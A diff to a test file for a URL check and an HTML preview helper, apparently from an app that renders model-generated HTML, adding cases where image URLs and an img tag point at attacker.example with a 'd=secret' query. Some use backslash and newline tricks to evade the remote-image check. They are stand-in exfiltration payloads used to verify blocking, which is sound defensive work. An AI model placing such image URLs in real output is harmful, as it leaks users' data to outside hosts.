@@ -1,4 +1,4 @@
-import { isRemoteImageUrl } from '../remoteImages';
+import { PREVIEW_IMAGE_CSP, htmlPreviewSrcDoc, isRemoteImageUrl } from '../remoteImages';
 
 describe('isRemoteImageUrl', () => {
   const origin = 'http://localhost:5701';
@@ -12,11 +12,30 @@ describe('isRemoteImageUrl', () => {
     ['other port', 'http://localhost:9999/x.png', true],
     ['protocol-relative URL', '//attacker.example/x.png', true],
     ['empty string', '', false],
+    // Browsers treat `\\` as `//` in markup URL attributes: this is a fetch.
+    ['two backslashes before the host', '\\\\attacker.example/p.png?d=secret', true],
+    ['one backslash before the host', '\\attacker.example/p.png', false],
+    ['backslashes inside an absolute URL', 'https:\\\\attacker.example/x.png', true],
+    ['scheme without slashes', 'https:attacker.example/x.png', true],
+    ['embedded newline in a remote URL', 'https://attacker.example\n/x.png', true],
+    ['backslash inside a relative path', 'images\\a.png', false],
   ])('treats %s as remote=%s', (_name, url, expected) => {
     expect(isRemoteImageUrl(url, origin)).toBe(expected);
   });
 
   it('fails closed on an unparseable absolute-looking URL', () => {
     expect(isRemoteImageUrl('https://[::1', origin)).toBe(true);
+  });
+});
+
+describe('htmlPreviewSrcDoc', () => {
+  it('injects a CSP that blocks remote images ahead of the model HTML', () => {
+    const srcDoc = htmlPreviewSrcDoc('<img src="https://attacker.example/?d=secret">');
+
+    expect(srcDoc).toContain(`content="${PREVIEW_IMAGE_CSP}"`);
+    expect(PREVIEW_IMAGE_CSP).toBe("img-src 'self' data: blob:");
+    expect(srcDoc.indexOf('Content-Security-Policy')).toBeLessThan(
+      srcDoc.indexOf('attacker.example')
+    );
   });
 });
